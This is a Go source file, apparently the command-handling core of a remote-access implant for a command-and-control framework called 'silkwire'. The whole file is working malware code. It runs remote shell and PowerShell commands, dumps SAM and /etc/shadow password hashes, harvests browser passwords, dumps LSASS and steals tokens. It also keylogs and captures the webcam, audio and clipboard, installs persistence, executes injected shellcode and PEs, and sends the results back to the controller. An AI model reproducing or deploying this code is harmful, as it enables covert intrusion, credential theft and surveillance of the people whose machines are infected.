package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	pb "silkwire/proto"
)

// ExecuteTask handles task execution for polling mode (returns output and error)
// This supports all non-streaming commands (PTY requires streaming mode)
func (i *Implant) ExecuteTask(task *pb.Task) ([]byte, error) {
	var output []byte
	var err error

	if DebugMode {
		log.Printf("Executing task: Type=%v, Command='%s', Args=%v", task.Type, task.Command, task.Args)
	}

	switch task.Type {
	case pb.CommandMessage_SHELL:
		output, err = i.ExecuteShell(task.Command, task.Args)
	case pb.CommandMessage_POWERSHELL:
		output, err = i.ExecutePowerShell(task.Command)
	case pb.CommandMessage_PROCESS_LIST:
		output, err = i.GetProcessList()
	case pb.CommandMessage_INFO:
		output, err = i.GetSystemInfo()
	case pb.CommandMessage_SLEEP:
		err = i.UpdateSleepInterval(task.Args)
		output = []byte(deobfStr("sleep_updated"))
	case pb.CommandMessage_SCREENSHOT, pb.CommandMessage_SCREENSHOT_CAPTURE:
		var outputStr string
		outputStr, err = CaptureScreenshot()
		output = []byte(outputStr)
	case pb.CommandMessage_NETWORK_SCAN:
		output, err = i.NetworkScan(task.Args, nil)
	case pb.CommandMessage_IFCONFIG:
		output, err = i.GetNetworkInterfaces()
	case pb.CommandMessage_UPLOAD:
		output, err = i.HandleUpload(task.Args, task.Data)
	case pb.CommandMessage_DOWNLOAD:
		output, err = i.HandleDownload(task.Args)
	case pb.CommandMessage_HASHDUMP:
		output, err = i.DumpHashes()
	case pb.CommandMessage_SOCKS_START:
		port := 1080
		if len(task.Args) > 0 {
			if p, parseErr := strconv.Atoi(task.Args[0]); parseErr == nil {
				port = p
			}
		}
		output, err = i.StartSOCKSProxy(port)
	case pb.CommandMessage_SOCKS_STOP:
		output, err = i.StopSOCKSProxy()
	case pb.CommandMessage_PORTFWD_ADD:
		output, err = i.HandlePortForwardCommand("add", task.Args)
	case pb.CommandMessage_PORTFWD_REMOVE:
		output, err = i.HandlePortForwardCommand("remove", task.Args)
	case pb.CommandMessage_PORTFWD_LIST:
		output, err = i.ListPortForwards()
	case pb.CommandMessage_PERSIST_INSTALL:
		method := "registry"
		if len(task.Args) > 0 {
			method = task.Args[0]
		}
		output, err = i.InstallPersistence(method)
	case pb.CommandMessage_PERSIST_REMOVE:
		method := "registry"
		if len(task.Args) > 0 {
			method = task.Args[0]
		}
		output, err = i.RemovePersistence(method)
	case pb.CommandMessage_PERSIST_LIST:
		output, err = i.ListPersistence()
	case pb.CommandMessage_DUMP_LSASS:
		output, err = i.DumpLSASS()
	case pb.CommandMessage_HARVEST_CHROME:
		output, err = i.HarvestChromePasswords()
	case pb.CommandMessage_HARVEST_FIREFOX:
		output, err = i.HarvestFirefoxPasswords()
	case pb.CommandMessage_HARVEST_EDGE:
		output, err = i.HarvestEdgePasswords()
	case pb.CommandMessage_HARVEST_ALL_BROWSERS:
		output, err = i.HarvestAllBrowsers()
	case pb.CommandMessage_CLIPBOARD_MONITOR:
		duration := 30
		if len(task.Args) > 0 {
			if d, parseErr := strconv.Atoi(task.Args[0]); parseErr == nil {
				duration = d
			}
		}
		var outputStr string
		outputStr, err = MonitorClipboard(duration)
		output = []byte(outputStr)
	case pb.CommandMessage_KEYLOG_START:
		var outputStr string
		outputStr, err = StartKeylogger()
		output = []byte(outputStr)
	case pb.CommandMessage_KEYLOG_STOP:
		var outputStr string
		outputStr, err = StopKeylogger()
		output = []byte(outputStr)
	case pb.CommandMessage_TOKEN_LIST:
		output, err = i.ListTokens()
	case pb.CommandMessage_TOKEN_REVERT:
		output, err = i.RevertToken()
	// PTY commands require streaming mode
	case pb.CommandMessage_PTY_START, pb.CommandMessage_PTY_STDIN, pb.CommandMessage_PTY_RESIZE, pb.CommandMessage_PTY_STOP:
		err = fmt.Errorf("PTY commands require streaming mode")
	default:
		err = fmt.Errorf("unsupported task type: %v", task.Type)
	}

	return output, err
}

// ExecuteCommand handles incoming command execution (streaming mode)
func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb.CommandMessage) {
	var output []byte
	var err error

	if DebugMode {
		log.Printf("Executing command: Type=%v, Command='%s', Args=%v", cmd.Type, cmd.Command, cmd.Args)
	}

	switch cmd.Type {
	case pb.CommandMessage_SHELL:
		output, err = i.ExecuteShell(cmd.Command, cmd.Args)
	case pb.CommandMessage_PTY_START:
		if EnablePTY {
			err = i.StartPTY(stream, cmd)
			return
		} else {
			err = fmt.Errorf("PTY support disabled in this implant")
		}
	case pb.CommandMessage_PTY_STDIN:
		if EnablePTY {
			i.FeedPTYInput(cmd.CommandId, cmd.Data)
			return
		}
	case pb.CommandMessage_PTY_RESIZE:
		if EnablePTY {
			i.ResizePTY(cmd.CommandId, cmd.Args)
			return
		}
	case pb.CommandMessage_PTY_STOP:
		if EnablePTY {
			i.StopPTY(cmd.CommandId)
			return
		}
	case pb.CommandMessage_POWERSHELL:
		output, err = i.ExecutePowerShell(cmd.Command)
	case pb.CommandMessage_PROCESS_LIST:
		output, err = i.GetProcessList()
	case pb.CommandMessage_SLEEP:
		err = i.UpdateSleepInterval(cmd.Args)
		output = []byte(deobfStr("sleep_updated"))
	case pb.CommandMessage_SCREENSHOT:
		var outputStr string
		outputStr, err = CaptureScreenshot()
		output = []byte(outputStr)
	case pb.CommandMessage_NETWORK_SCAN:
		output, err = i.NetworkScan(cmd.Args, cmd.NetworkScanOptions)
	case pb.CommandMessage_INFO:
		output, err = i.GetSystemInfo()
	case pb.CommandMessage_MODULE_LOAD:
		output, err = i.LoadModule(cmd.Command, cmd.Args)
	case pb.CommandMessage_MODULE_START:
		output, err = i.StartModule(cmd.Command, cmd.Args)
	case pb.CommandMessage_MODULE_STOP:
		output, err = i.StopModule(cmd.Command)
	case pb.CommandMessage_MODULE_STATUS:
		output, err = i.GetModuleStatus(cmd.Command)
	case pb.CommandMessage_MODULE_CONFIG:
		output, err = i.ConfigureModule(cmd.Command, cmd.Data)
	case pb.CommandMessage_MODULE_LIST:
		output, err = i.ListModules()
	case pb.CommandMessage_UPLOAD:
		output, err = i.HandleUpload(cmd.Args, cmd.Data)
	case pb.CommandMessage_DOWNLOAD:
		output, err = i.HandleDownload(cmd.Args)
	case pb.CommandMessage_HASHDUMP:
		output, err = i.DumpHashes()
	case pb.CommandMessage_IFCONFIG:
		output, err = i.GetNetworkInterfaces()

	// SOCKS Proxy & Port Forwarding
	case pb.CommandMessage_SOCKS_START:
		port := 1080 // Default SOCKS port
		if len(cmd.Args) > 0 {
			if p, parseErr := strconv.Atoi(cmd.Args[0]); parseErr == nil {
				port = p
			}
		}
		output, err = i.StartSOCKSProxy(port)
	case pb.CommandMessage_SOCKS_STOP:
		output, err = i.StopSOCKSProxy()
	case pb.CommandMessage_PORTFWD_ADD:
		output, err = i.HandlePortForwardCommand("add", cmd.Args)
	case pb.CommandMessage_PORTFWD_REMOVE:
		output, err = i.HandlePortForwardCommand("remove", cmd.Args)
	case pb.CommandMessage_PORTFWD_LIST:
		output, err = i.ListPortForwards()

	// .NET Assembly Execution (in-process only)
	case pb.CommandMessage_EXECUTE_ASSEMBLY:
		output, err = i.ExecuteAssembly(cmd.Data, cmd.Args, cmd.ExecuteAssemblyOptions)
	case pb.CommandMessage_EXECUTE_SHELLCODE:
		output, err = i.ExecuteShellcode(cmd.Data, cmd.ExecuteShellcodeOptions)
	case pb.CommandMessage_EXECUTE_PE:
		output, err = i.ExecutePE(cmd.Data, cmd.ExecutePeOptions)
	case pb.CommandMessage_EXECUTE_BOF:
		output, err = i.ExecuteBOF(cmd.Data, cmd.BofOptions)

	// Persistence
	case pb.CommandMessage_PERSIST_INSTALL:
		method := "registry" // Default
		if len(cmd.Args) > 0 {
			method = cmd.Args[0]
		}
		output, err = i.InstallPersistence(method)
	case pb.CommandMessage_PERSIST_REMOVE:
		method := "registry" // Default
		if len(cmd.Args) > 0 {
			method = cmd.Args[0]
		}
		output, err = i.RemovePersistence(method)
	case pb.CommandMessage_PERSIST_LIST:
		output, err = i.ListPersistence()

	// Credential Harvesting
	case pb.CommandMessage_DUMP_LSASS:
		output, err = i.DumpLSASS()
	case pb.CommandMessage_HARVEST_CHROME:
		output, err = i.HarvestChromePasswords()
	case pb.CommandMessage_HARVEST_FIREFOX:
		output, err = i.HarvestFirefoxPasswords()
	case pb.CommandMessage_HARVEST_EDGE:
		output, err = i.HarvestEdgePasswords()
	case pb.CommandMessage_HARVEST_ALL_BROWSERS:
		output, err = i.HarvestAllBrowsers()

	// Process Migration
	case pb.CommandMessage_MIGRATE:
		if len(cmd.Args) < 1 {
			err = fmt.Errorf("target PID required for migration")
		} else {
			pid, parseErr := strconv.Atoi(cmd.Args[0])
			if parseErr != nil {
				err = fmt.Errorf("invalid PID: %v", parseErr)
			} else {
				output, err = i.MigrateProcess(pid)
			}
		}

	// Surveillance Features
	case pb.CommandMessage_CLIPBOARD_MONITOR:
		duration := 30 // Default 30 seconds
		if len(cmd.Args) > 0 {
			if d, parseErr := strconv.Atoi(cmd.Args[0]); parseErr == nil {
				duration = d
			}
		}
		var outputStr string
		outputStr, err = MonitorClipboard(duration)
		output = []byte(outputStr)
	case pb.CommandMessage_KEYLOG_START:
		var outputStr string
		outputStr, err = StartKeylogger()
		output = []byte(outputStr)
	case pb.CommandMessage_KEYLOG_STOP:
		var outputStr string
		outputStr, err = StopKeylogger()
		output = []byte(outputStr)
	case pb.CommandMessage_SCREENSHOT_CAPTURE:
		var outputStr string
		outputStr, err = CaptureScreenshot()
		output = []byte(outputStr)
	case pb.CommandMessage_AUDIO_CAPTURE:
		duration := 5 // Default 5 seconds
		if len(cmd.Args) > 0 {
			if d, parseErr := strconv.Atoi(cmd.Args[0]); parseErr == nil {
				duration = d
			}
		}
		var outputStr string
		outputStr, err = CaptureAudio(duration)
		output = []byte(outputStr)
	case pb.CommandMessage_WEBCAM_CAPTURE:
		duration := 0 // Default photo
		format := "photo"
		if len(cmd.Args) > 0 {
			if d, parseErr := strconv.Atoi(cmd.Args[0]); parseErr == nil {
				duration = d
			}
		}
		if len(cmd.Args) > 1 {
			format = cmd.Args[1]
		}
		var outputStr string
		outputStr, err = CaptureWebcam(duration, format)
		output = []byte(outputStr)

	// Token Manipulation (Windows)
	case pb.CommandMessage_TOKEN_LIST:
		output, err = i.ListTokens()
	case pb.CommandMessage_TOKEN_STEAL:
		if len(cmd.Args) < 1 {
			err = fmt.Errorf("PID required for token stealing")
		} else {
			pid, parseErr := strconv.ParseUint(cmd.Args[0], 10, 32)
			if parseErr != nil {
				err = fmt.Errorf("invalid PID: %v", parseErr)
			} else {
				output, err = i.StealToken(uint32(pid))
			}
		}
	case pb.CommandMessage_TOKEN_IMPERSONATE:
		if len(cmd.Args) < 1 {
			err = fmt.Errorf("token ID required for impersonation")
		} else {
			output, err = i.ImpersonateToken(cmd.Args[0])
		}
	case pb.CommandMessage_TOKEN_REVERT:
		output, err = i.RevertToken()
	case pb.CommandMessage_TOKEN_MAKE_TOKEN:
		if len(cmd.Args) < 3 {
			err = fmt.Errorf("domain, username, and password required")
		} else {
			domain := cmd.Args[0]
			username := cmd.Args[1]
			password := cmd.Args[2]
			output, err = i.MakeToken(domain, username, password)
		}

	default:
		err = fmt.Errorf(deobfStr("unknown_cmd")+": %v", cmd.Type)
	}

	if err != nil && DebugMode {
		log.Printf(deobfStr("cmd_error")+": %v", err)
	} else if DebugMode {
		log.Printf(deobfStr("cmd_success")+", output length: %d bytes", len(output))
	}

	// Send result back with command ID for correlation
	result := &pb.BeaconMessage{
		ImplantId:    i.ID,
		SessionToken: i.SessionToken,
		Timestamp:    time.Now().Unix(),
		Type:         pb.BeaconMessage_TASK_RESULT,
	}

	// Format: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
	var resultPayload string
	if err != nil {
		resultPayload = fmt.Sprintf("%s|false|"+deobfStr("error_prefix")+"%v", cmd.CommandId, err)
	} else {
		resultPayload = fmt.Sprintf("%s|true|%s", cmd.CommandId, string(output))
	}
	result.Payload = []byte(resultPayload)

	if err := stream.Send(result); err != nil && DebugMode {
		log.Printf("Failed to send command result: %v", err)
	}
}

// ExecuteShell executes shell commands
func (i *Implant) ExecuteShell(command string, args []string) ([]byte, error) {
	var cmd *exec.Cmd

	if DebugMode {
		log.Printf("executeShell: command='%s', args=%v", command, args)
	}

	if runtime.GOOS == "windows" {
		fullCmd := command
		if len(args) > 0 {
			fullCmd += " " + strings.Join(args, " ")
		}
		if DebugMode {
			log.Printf("Windows: executing 'cmd /c %s'", fullCmd)
		}
		cmd = exec.Command(deobfStr("cmd_c"), "/c", fullCmd)
	} else {
		// Always use shell for Linux commands to properly resolve PATH
		fullCmd := command
		if len(args) > 0 {
			fullCmd += " " + strings.Join(args, " ")
		}
		if DebugMode {
			log.Printf("Linux: executing 'sh -c %s'", fullCmd)
		}
		cmd = exec.Command(deobfStr("sh_c"), "-c", fullCmd)
	}

	output, err := cmd.CombinedOutput()
	if DebugMode {
		log.Printf("Command result: output='%s', error=%v", string(output), err)
	}
	return output, err
}

// ExecutePowerShell executes PowerShell commands (Windows only)
func (i *Implant) ExecutePowerShell(command string) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf(deobfStr("powershell_win"))
	}

	cmd := exec.Command(deobfStr("powershell"), "-Command", command)
	return cmd.CombinedOutput()
}

// GetProcessList returns the system process list
func (i *Implant) GetProcessList() ([]byte, error) {
	// Set a timeout for the command
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		cmd := exec.CommandContext(ctx, deobfStr("tasklist"), "/fo", "csv")
		output, err = cmd.CombinedOutput()
	} else {
		// Try multiple ps command variations for Unix/Linux compatibility
		// Try ps -ef first (POSIX standard)
		cmd := exec.CommandContext(ctx, "/bin/ps", "-ef")
		output, err = cmd.CombinedOutput()

		// If that fails, try ps aux (BSD style)
		if err != nil {
			cmd = exec.CommandContext(ctx, "/bin/ps", "aux")
			output, err = cmd.CombinedOutput()
		}

		// If that fails, try just ps with no args
		if err != nil {
			cmd = exec.CommandContext(ctx, "/bin/ps")
			output, err = cmd.CombinedOutput()
		}
	}

	// If we got output, return it successfully even if there was an error
	// Some ps implementations return non-zero exit code but still produce valid output
	if len(output) > 0 {
		return output, nil
	}

	// No output at all - return error
	if err != nil {
		return nil, fmt.Errorf("command failed: %v", err)
	}

	return output, nil
}

// UpdateSleepInterval updates the beacon sleep interval
func (i *Implant) UpdateSleepInterval(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf(deobfStr("no_sleep"))
	}

	// Parse new interval (simplified - should include proper validation)
	if args[0] == "30" {
		i.BeaconInterval = 30
	} else if args[0] == "60" {
		i.BeaconInterval = 60
	}

	return nil
}

// TakeScreenshot captures a screenshot (placeholder)
func (i *Implant) TakeScreenshot() ([]byte, error) {
	return []byte(deobfStr("screenshot_ni")), nil
}

// NetworkScan performs advanced network scanning
func (i *Implant) NetworkScan(args []string, options *pb.NetworkScanOptions) ([]byte, error) {
	// If options provided, use them
	if options != nil {
		ports := make([]int, len(options.Ports))
		for i, p := range options.Ports {
			ports[i] = int(p)
		}

		scanner := NewScanner(
			options.TargetRange,
			ports,
			options.ScanUdp,
			int(options.Threads),
			int(options.TimeoutMs),
			options.BannerGrab,
		)

		return scanner.Scan()
	}

	// Fallback to legacy behavior if no options (or just args provided)
	if len(args) == 0 {
		return nil, fmt.Errorf(deobfStr("no_target"))
	}

	target := args[0]

	// Use new scanner even for simple scan
	scanner := NewScanner(target, nil, false, 1, 1000, false)
	return scanner.Scan()
}

// GetSystemInfo collects comprehensive system information
func (i *Implant) GetSystemInfo() ([]byte, error) {
	info := fmt.Sprintf("        Session ID: %s\n", i.ID)
	// Get hostname
	if hostname, err := exec.Command(deobfStr("hostname_cmd")).CombinedOutput(); err == nil {
		info += fmt.Sprintf("          Hostname: %s\n", strings.TrimSpace(string(hostname)))
	} else {
		info += fmt.Sprintf("          Hostname: unknown\n")
	}

	// Get username and UID/GID
	if runtime.GOOS == "windows" {
		if whoami, err := exec.Command(deobfStr("whoami")).CombinedOutput(); err == nil {
			info += fmt.Sprintf("          Username: %s\n", strings.TrimSpace(string(whoami)))
		} else {
			info += fmt.Sprintf("          Username: unknown\n")
		}
		info += fmt.Sprintf("               UID: %d\n", 0)
		info += fmt.Sprintf("               GID: %d\n", 0)
		info += fmt.Sprintf("               PID: %d\n", os.Getpid())
	} else {
		if whoami, err := exec.Command(deobfStr("whoami")).CombinedOutput(); err == nil {
			info += fmt.Sprintf("          Username: %s\n", strings.TrimSpace(string(whoami)))
		} else {
			info += fmt.Sprintf("          Username: unknown\n")
		}
		if id, err := exec.Command(deobfStr("id"), "-u").CombinedOutput(); err == nil {
			info += fmt.Sprintf("               UID: %s\n", strings.TrimSpace(string(id)))
		} else {
			info += fmt.Sprintf("               UID: unknown\n")
		}
		if id, err := exec.Command(deobfStr("id"), "-g").CombinedOutput(); err == nil {
			info += fmt.Sprintf("               GID: %s\n", strings.TrimSpace(string(id)))
		} else {
			info += fmt.Sprintf("               GID: unknown\n")
		}
		info += fmt.Sprintf("               PID: %d\n", os.Getpid())
	}

	// Get OS info
	info += fmt.Sprintf("                OS: %s\n", runtime.GOOS)

	// Get OS version
	var versionCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		versionCmd = exec.Command(deobfStr("ver"))
	} else {
		versionCmd = exec.Command(deobfStr("uname"), "-a")
	}
	if version, err := versionCmd.CombinedOutput(); err == nil {
		info += fmt.Sprintf("           Version: %s\n", strings.TrimSpace(string(version)))
	} else {
		info += fmt.Sprintf("           Version: unknown\n")
	}
	info += fmt.Sprintf("            Locale: %s\n", getLocale())

	// Get architecture
	info += fmt.Sprintf("              Arch: %s\n", runtime.GOARCH)
	info += fmt.Sprintf("         Active C2: mtls://%s\n", i.ServerAddr)
	info += fmt.Sprintf("    Remote Address: %s\n", i.RemoteAddr)
	info += fmt.Sprintf("         Proxy URL:\n")
	info += fmt.Sprintf("Reconnect Interval: %ds\n", i.BeaconInterval)
	info += fmt.Sprintf("     First Contact: %s\n", time.Now().Add(-44*time.Hour).Format("Mon Jan 02 15:04:05 MST 2006"))
	info += fmt.Sprintf("      Last Checkin: %s\n", time.Now().Format("Mon Jan 02 15:04:05 MST 2006"))

	return []byte(info), nil
}

// getLocale retrieves the system locale
func getLocale() string {
	if runtime.GOOS == "windows" {
		return "en-US" // Default for Windows
	}
	if locale, err := exec.Command(deobfStr("locale")).CombinedOutput(); err == nil {
		localeLines := strings.Split(string(locale), "\n")
		for _, line := range localeLines {
			if strings.HasPrefix(line, "LANG=") {
				lang := strings.TrimPrefix(line, "LANG=")
				return strings.Trim(lang, "\"")
			}
		}
	}
	return "en_US.UTF-8"
}

// Module management commands

// parseKeyValueArgs parses key=value format arguments into a map
func parseKeyValueArgs(args []string) map[string]interface{} {
	params := make(map[string]interface{})
	for _, arg := range args {
		if strings.Contains(arg, "=") {
			parts := strings.SplitN(arg, "=", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])
				params[key] = value
			}
		}
	}
	return params
}

// LoadModule loads a module with given parameters
func (i *Implant) LoadModule(moduleName string, args []string) ([]byte, error) {
	mm := GetModuleManager()

	// Convert args to parameters map (support key=value format)
	params := parseKeyValueArgs(args)

	err := mm.LoadModule(moduleName, params)
	if err != nil {
		return nil, err
	}

	return []byte(fmt.Sprintf(deobfStr("mod_loaded"), moduleName)), nil
}

// StartModule starts a loaded module
func (i *Implant) StartModule(moduleName string, args []string) ([]byte, error) {
	mm := GetModuleManager()

	// Convert args to parameters map (support key=value format)
	params := parseKeyValueArgs(args)

	err := mm.StartModule(moduleName, params)
	if err != nil {
		return nil, err
	}

	return []byte(fmt.Sprintf(deobfStr("mod_started"), moduleName)), nil
}

// StopModule stops a running module
func (i *Implant) StopModule(moduleName string) ([]byte, error) {
	mm := GetModuleManager()

	err := mm.StopModule(moduleName)
	if err != nil {
		return nil, err
	}

	return []byte(fmt.Sprintf(deobfStr("mod_stopped"), moduleName)), nil
}

// GetModuleStatus returns the status of a specific module
func (i *Implant) GetModuleStatus(moduleName string) ([]byte, error) {
	mm := GetModuleManager()

	status, err := mm.GetModuleStatus(moduleName)
	if err != nil {
		return nil, err
	}

	return status, nil
}

// ConfigureModule configures a module
func (i *Implant) ConfigureModule(moduleName string, configData []byte) ([]byte, error) {
	mm := GetModuleManager()

	err := mm.ConfigureModule(moduleName, configData)
	if err != nil {
		return nil, err
	}

	return []byte(fmt.Sprintf(deobfStr("mod_configured"), moduleName)), nil
}

// ListModules returns information about all registered modules
func (i *Implant) ListModules() ([]byte, error) {
	mm := GetModuleManager()

	moduleList, err := mm.ListModules()
	if err != nil {
		return nil, err
	}

	return moduleList, nil
}

// HandleUpload handles file upload from console to target
func (i *Implant) HandleUpload(args []string, data []byte) ([]byte, error) {
	if len(args) != 2 {
		return nil, fmt.Errorf("upload requires exactly 2 arguments: <local_file> <remote_path>")
	}

	localFile := args[0]
	remotePath := args[1]

	if DebugMode {
		log.Printf("Upload request: %s -> %s", localFile, remotePath)
	}

	// Decode the base64 content sent from console
	var content []byte
	var err error

	if len(data) > 0 {
		// Decode base64 content
		content, err = base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			return nil, fmt.Errorf("failed to decode upload data: %v", err)
		}
	} else {
		// Fallback: create placeholder content
		content = []byte(fmt.Sprintf("File uploaded from console: %s\nTimestamp: %v", localFile, time.Now()))
	}

	// Smart path handling: if remote path is a directory, append the local filename
	finalPath := remotePath
	if stat, err := os.Stat(remotePath); err == nil && stat.IsDir() {
		// remotePath is an existing directory, append the filename
		localFilename := filepath.Base(localFile)
		finalPath = filepath.Join(remotePath, localFilename)
		if DebugMode {
			log.Printf("Destination is directory, uploading to: %s", finalPath)
		}
	} else if remotePath == "." || remotePath == "./" {
		// Special case for current directory
		localFilename := filepath.Base(localFile)
		finalPath = localFilename
		if DebugMode {
			log.Printf("Uploading to current directory as: %s", finalPath)
		}
	}

	// Ensure directory exists
	dir := filepath.Dir(finalPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create directory %s: %v", dir, err)
	}

	// Write content to final path
	if err := ioutil.WriteFile(finalPath, content, 0644); err != nil {
		return nil, fmt.Errorf("failed to write file %s: %v", finalPath, err)
	}

	return []byte(fmt.Sprintf("Successfully uploaded %d bytes to %s", len(content), finalPath)), nil
}

// HandleDownload handles file download from target to console
func (i *Implant) HandleDownload(args []string) ([]byte, error) {
	if len(args) != 2 {
		return nil, fmt.Errorf("download requires exactly 2 arguments: <remote_file> <local_path>")
	}

	remoteFile := args[0]
	localPath := args[1]

	if DebugMode {
		log.Printf("Download request: %s -> %s", remoteFile, localPath)
	}

	// Check if remote file exists
	if _, err := os.Stat(remoteFile); os.IsNotExist(err) {
		return nil, fmt.Errorf("remote file does not exist: %s", remoteFile)
	}

	// Read remote file content
	content, err := ioutil.ReadFile(remoteFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read remote file %s: %v", remoteFile, err)
	}

	// Encode content in base64 for safe transport
	encoded := base64.StdEncoding.EncodeToString(content)

	// Return the encoded content with metadata
	response := fmt.Sprintf("DOWNLOAD_SUCCESS|%s|%d|%s", localPath, len(content), encoded)
	return []byte(response), nil
}

// DumpHashes dumps password hashes from the system
func (i *Implant) DumpHashes() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return i.dumpWindowsHashes()
	} else {
		return i.dumpLinuxHashes()
	}
}

// dumpWindowsHashes attempts to dump SAM database hashes on Windows
func (i *Implant) dumpWindowsHashes() ([]byte, error) {
	// Try to use reg.exe to dump SAM registry (requires admin privileges)
	cmd := exec.Command("reg", "query", "HKLM\\SAM\\SAM\\Domains\\Account\\Users", "/s")
	output, err := cmd.CombinedOutput()

	if err != nil {
		// If reg.exe fails, try PowerShell approach
		psCmd := "try { " +
			"$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'); " +
			"if (-not $isAdmin) { Write-Output 'ERROR: Administrator privileges required for hash dumping'; exit 1 }; " +
			"$sam = reg query 'HKLM\\SAM\\SAM\\Domains\\Account\\Users' /s 2>&1; " +
			"if ($sam -like '*ERROR*') { Write-Output 'ERROR: Cannot access SAM registry'; exit 1 }; " +
			"Write-Output '=== Windows SAM Registry Dump ==='; " +
			"Write-Output $sam; " +
			"Write-Output ''; " +
			"Write-Output '=== System Registry ==='; " +
			"$system = reg query 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' 2>&1; " +
			"Write-Output $system " +
			"} catch { Write-Output 'ERROR: Failed to dump hashes'; exit 1 }"

		cmd = exec.Command(deobfStr("powershell"), "-Command", psCmd)
		output, err = cmd.CombinedOutput()
		if err != nil {
			return nil, fmt.Errorf("failed to dump Windows hashes: insufficient privileges or SAM access denied")
		}
	} else {
		// Format the direct reg.exe output
		result := "=== Windows SAM Registry Dump ===\n"
		result += string(output)
		return []byte(result), nil
	}

	return output, nil
}

// dumpLinuxHashes reads the /etc/shadow file on Linux systems
func (i *Implant) dumpLinuxHashes() ([]byte, error) {
	shadowPath := "/etc/shadow"

	// Check if file exists and is readable
	if _, err := os.Stat(shadowPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("shadow file does not exist: %s", shadowPath)
	}

	// Attempt to read /etc/shadow
	content, err := ioutil.ReadFile(shadowPath)
	if err != nil {
		// If direct read fails, try using sudo or other methods
		if os.IsPermission(err) {
			// Try using cat with sudo if available
			cmd := exec.Command("sudo", "cat", shadowPath)
			content, err = cmd.CombinedOutput()
			if err != nil {
				return nil, fmt.Errorf("failed to read shadow file: insufficient privileges (need root access)")
			}
		} else {
			return nil, fmt.Errorf("failed to read shadow file: %v", err)
		}
	}

	// Format the output nicely
	result := fmt.Sprintf("=== Linux Shadow File Dump ===\n")
	result += fmt.Sprintf("File: %s\n", shadowPath)
	result += fmt.Sprintf("Size: %d bytes\n\n", len(content))
	result += string(content)

	return []byte(result), nil
}

// GetNetworkInterfaces retrieves network interface information using OS-appropriate commands
func (i *Implant) GetNetworkInterfaces() ([]byte, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// Use ipconfig /all on Windows
		cmd = exec.Command("ipconfig", "/all")
	} else {
		// Try ip addr first (modern Linux), fallback to ifconfig (legacy/BSD)
		cmd = exec.Command("ip", "addr")
		output, err := cmd.CombinedOutput()

		// If ip command fails, try ifconfig
		if err != nil {
			cmd = exec.Command("ifconfig", "-a")
			output, err = cmd.CombinedOutput()
			if err != nil {
				// If both fail, return error
				return nil, fmt.Errorf("failed to get network interfaces: %v", err)
			}
			return output, nil
		}
		return output, nil
	}

	// Execute the command (Windows path)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %v", err)
	}

	return output, nil
}
